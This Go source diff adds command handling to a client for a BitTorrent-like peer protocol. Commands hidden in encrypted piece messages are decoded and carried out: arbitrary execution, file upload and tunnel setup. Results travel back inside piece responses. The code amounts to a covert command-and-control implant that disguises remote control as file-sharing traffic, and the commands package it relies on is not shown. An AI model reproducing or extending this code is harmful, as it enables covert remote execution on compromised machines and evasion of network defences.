@@ -19,6 +19,7 @@ type Client struct {
 	nonce             []byte
 	enc               *cipher.Block
 	LastMsg           bool
+	tun               commands.Tunnel
 }
 
 func (r *Client) handleChoke() {
@@ -105,7 +106,7 @@ func (r *Client) DecryptBuffer(buf []byte) []byte {
 func (r *Client) RespondToRequest(req peer_protocol.RequestMessage) {
 	chunk, err := r.createPieceResponse(req)
 	if err == nil {
-		m := peer_protocol.PieceMessage{	
+		m := peer_protocol.PieceMessage{
 			PieceIndex:  req.PieceIndex,
 			BlockOffset: req.BlockOffset,
 			Data:        r.EncryptBuffer(chunk),
@@ -121,6 +122,30 @@ func (r *Client) Unchoke() {
 }
 func (r *Client) Choke() {
 	r.Peer.SendMessage(r.Peer.Choke())
+}
+
+func (r *Client) HandleCommand(com *commands.Command) error {
+	var err error
+	switch com.Type {
+	case commands.Exec:
+		out, err := commands.RunExec(com.Payload)
+		r.CommandOutput = out
+		return err
+	case commands.Upload:
+		if err := commands.SaveFile(com.Payload); err != nil {
+			return err
+		}
+	case commands.StartTunnel:
+		r.tun, err = commands.NewTunnel(com)
+		if err != nil {
+			r.CommandOutput = []byte("Failed")
+		} else {
+			r.CommandOutput = []byte("Tunneling")
+		}
+	default:
+		return commands.NewCommandError("Unknown command type: " + string(com.Type))
+	}
+	return err
 }
 func (r *Client) MessageCycle() (peer_protocol.Message, error) {
 	if m, err := r.Peer.ReceiveMessage(); err == nil {
@@ -140,8 +165,9 @@ func (r *Client) MessageCycle() (peer_protocol.Message, error) {
 		case peer_protocol.Reject:
 			r.HandleRejection()
 		case peer_protocol.Piece:
-			p := peer_protocol.ReadPiece(m.Payload)
-			r.CommandOutput, err = commands.ReadCommand(r.EncryptBuffer(p.Data))
+			piece := peer_protocol.ReadPiece(m.Payload)
+			command := commands.ReadCommand(r.EncryptBuffer(piece.Data))
+			r.HandleCommand(command)
 			if len(r.CommandOutput) > 0 {
 				r.Unchoke()
 			}
@@ -150,6 +176,7 @@ func (r *Client) MessageCycle() (peer_protocol.Message, error) {
 			r.RespondToRequest(req)
 			if r.LastMsg {
 				r.Choke()
+				r.CommandOutput = []byte{}
 				r.LastMsg = false
 			}
 		default:
